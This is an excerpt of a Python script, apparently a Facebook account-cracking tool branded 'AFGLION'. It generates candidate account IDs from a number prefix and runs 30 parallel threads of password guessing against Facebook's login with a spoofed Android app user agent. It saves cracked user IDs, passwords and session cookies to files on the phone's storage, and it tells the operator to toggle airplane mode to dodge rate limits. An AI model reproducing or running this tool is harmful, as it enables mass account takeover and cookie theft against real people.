...
def S1():
	...
	e = ";[FBAN/FB4A;FBAV/80.0.0.28.110;FBBV/58059063;FBDM/{density=2.625,width=1080,height=2160};FBLC/en_US;FBRV/58059063;FBCR/Motorola;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto G6;FBSV/8.0;FBOP/1;FBCA/armeabi-v7a;]"
	ua = s + e	
	return ua
    ...
    try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/AFG.txt.etc..')
                                line()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m After Every 3 Min Turn Airplane On/Off For 5 sec\033[1;37m")
                                        line()
                                        for user in fo:
...
def afg():
                user=[]
                clear()
                print('\x1b[1;92m CODE EXAMPLE : 9378,9370,9379,974')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                ...
                with tred(max_workers=30) as S1N:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','afghan1234','kabul1234','khan123','khan123456','khan786','pubgpubg','pubg123','pubg12345','123456789','555555','ahmad123','jan123','malik123']
                                S1N.submit(rd,ids,passlist)
                print('\033[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [AFGLION-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/AFGLION-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [AFGLION-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/AFGLION-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
	...
	try:
		...
		for pas in passlist:                                          
			...
			if 'session_key' in po:
				...
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				open('/sdcard/AFG LION-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
                                
				break
			elif 'www.facebook.com' in po['error']['message']:                                
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;31m [AFG LION-CP] '+uid+' | '+pas+'\033[1;97m')
